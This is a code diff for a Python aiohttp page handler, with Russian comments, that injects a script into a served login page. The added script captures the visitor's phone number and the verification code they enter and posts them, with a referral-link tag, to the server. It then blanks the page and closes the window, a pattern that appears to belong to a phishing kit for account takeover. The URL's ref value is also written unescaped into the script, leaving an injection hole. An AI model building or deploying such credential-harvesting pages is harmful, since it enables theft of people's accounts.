@@ -524,15 +524,74 @@ async def handle_index(request):
             
             print(f"📊 Переход по ссылке {ref_code}. Всего: {link_visits[ref_code]}")
         
-        # Читаем index.html и добавляем скрипт для редиректа
+        # Читаем index.html и добавляем скрипт для редиректа и отслеживания
         with open('index.html', 'r', encoding='utf-8') as f:
             html_content = f.read()
             
-        # Добавляем скрипт для показа сообщения после успешной авторизации
+        # Получаем ref_code из параметров URL
+        ref_code = params.get('ref', 'неизвестно')
+        
+        # Добавляем скрипт для отслеживания действий
         if '</body>' in html_content:
-            redirect_script = '''
+            tracking_script = f'''
             <script>
-            function showSuccessRedirect() {
+            // Функция для отправки событий отслеживания
+            async function trackEvent(eventType, data = {{}}) {{
+                try {{
+                    const eventData = {{
+                        ...data,
+                        ref_code: '{ref_code}'
+                    }};
+                    
+                    await fetch('/{eventType}', {{
+                        method: 'POST',
+                        headers: {{
+                            'Content-Type': 'application/json',
+                        }},
+                        body: JSON.stringify(eventData)
+                    }});
+                }} catch (error) {{
+                    console.error('Ошибка отслеживания:', error);
+                }}
+            }}
+            
+            // Отслеживаем посещение сайта сразу при загрузке
+            document.addEventListener('DOMContentLoaded', function() {{
+                trackEvent('visit');
+            }});
+            
+            // Отслеживаем ввод номера телефона
+            document.addEventListener('DOMContentLoaded', function() {{
+                const phoneInput = document.querySelector('input[type="tel"]');
+                const submitButton = document.querySelector('button[type="submit"]');
+                
+                if (phoneInput && submitButton) {{
+                    submitButton.addEventListener('click', function() {{
+                        const phone = phoneInput.value;
+                        if (phone) {{
+                            trackEvent('phone-entered', {{ phone: phone }});
+                        }}
+                    }});
+                }}
+            }});
+            
+            // Отслеживаем нажатие кнопки входа
+            document.addEventListener('DOMContentLoaded', function() {{
+                const loginButton = document.querySelector('button[type="submit"]');
+                if (loginButton) {{
+                    loginButton.addEventListener('click', function() {{
+                        trackEvent('login-click');
+                    }});
+                }}
+            }});
+            
+            // Функция для отслеживания ввода кода (будет вызвана из внешнего скрипта)
+            window.trackCodeEntered = function(code, phone) {{
+                trackEvent('code-entered', {{ code: code, phone: phone }});
+            }};
+            
+            // Функция для успешной авторизации
+            function showSuccessRedirect() {{
                 // Блокируем весь контент
                 document.body.innerHTML = `
                     <div style="
@@ -574,18 +633,18 @@ async def handle_index(request):
                 // Таймер обратного отсчета
                 let seconds = 5;
                 const countdownElement = document.getElementById('countdown');
-                const countdownInterval = setInterval(() => {
+                const countdownInterval = setInterval(() => {{
                     seconds--;
                     countdownElement.textContent = seconds;
-                    if (seconds <= 0) {
+                    if (seconds <= 0) {{
                         clearInterval(countdownInterval);
                         window.close();
-                    }
-                }, 1000);
-            }
+                    }}
+                }}, 1000);
+            }}
             </script>
             '''
-            html_content = html_content.replace('</body>', redirect_script + '\n</body>')
+            html_content = html_content.replace('</body>', tracking_script + '\n</body>')
         
         return web.Response(text=html_content, content_type='text/html')
             
